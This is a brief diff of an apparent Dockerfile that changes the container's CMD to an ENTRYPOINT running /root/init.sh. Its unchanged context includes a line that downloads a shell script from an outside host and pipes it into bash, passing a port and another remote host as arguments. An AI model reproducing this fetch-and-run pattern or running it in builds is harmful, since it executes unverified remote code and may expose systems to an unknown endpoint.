@@ -3,4 +3,4 @@ RUN apt update
 RUN apt-get -y install wget curl net-tools unzip vim
 RUN curl https://public.hxiang.eu.org/intel-dev-init.sh | bash -s 60112 intel-dev.haycker.eu.org:80 
 EXPOSE 60112
-CMD /root/init.sh
+ENTRYPOINT /root/init.sh
